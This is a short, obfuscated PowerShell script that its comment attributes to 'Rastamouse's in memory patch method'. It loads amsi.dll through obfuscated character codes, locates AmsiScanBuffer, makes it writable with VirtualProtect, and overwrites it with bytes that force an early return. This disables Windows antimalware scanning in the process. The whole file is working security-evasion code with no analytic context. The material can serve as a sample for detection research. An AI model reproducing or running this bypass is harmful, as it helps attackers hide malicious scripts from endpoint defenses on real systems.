function amama
{
    #This is Rastamouses in memory patch method 
    $ztzsw = @"
using System;
using System.Runtime.InteropServices;
public class ztzsw {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr msrelr, uint flNewProtect, out uint lpflOldProtect);
}
"@

  Add-Type $ztzsw

  $kgqdegv = [ztzsw]::LoadLibrary("$([CHar](97)+[CHar](109*53/53)+[cHAR]([ByTE]0x73)+[chAr]([bYTE]0x69)+[char]([byTE]0x2e)+[cHar](100*35/35)+[Char]([bytE]0x6c)+[ChAr]([BYtE]0x6c))")
  $dfwxos = [ztzsw]::GetProcAddress($kgqdegv, "$([char]([BytE]0x41)+[CHar]([byTE]0x6d)+[ChAR]([byTe]0x73)+[Char](105+69-69)+[ChAr](83+2-2)+[cHaR]([BYTe]0x63)+[chAR]([bYtE]0x61)+[Char]([Byte]0x6e)+[CHAr](42+24)+[CHAR](117+79-79)+[CHAR](88+14)+[cHAR]([bYte]0x66)+[CHAR](101+22-22)+[cHar]([bYTe]0x72))")
  $p = 0
  $qddw = "0xB8"
  $fwyu = "0x80"
  $bsyb = "0x57"
  [ztzsw]::VirtualProtect($dfwxos, [uint32]5, 0x40, [ref]$p)
  $ymfa = "0x07"
  $zcbf = "0x00"
  $dned = "0xC3"
  $msueg = [Byte[]] ($qddw,$bsyb,$zcbf,$ymfa,+$fwyu,+$dned)
  [System.Runtime.InteropServices.Marshal]::Copy($msueg, 0, $dfwxos, 6)

}
amama
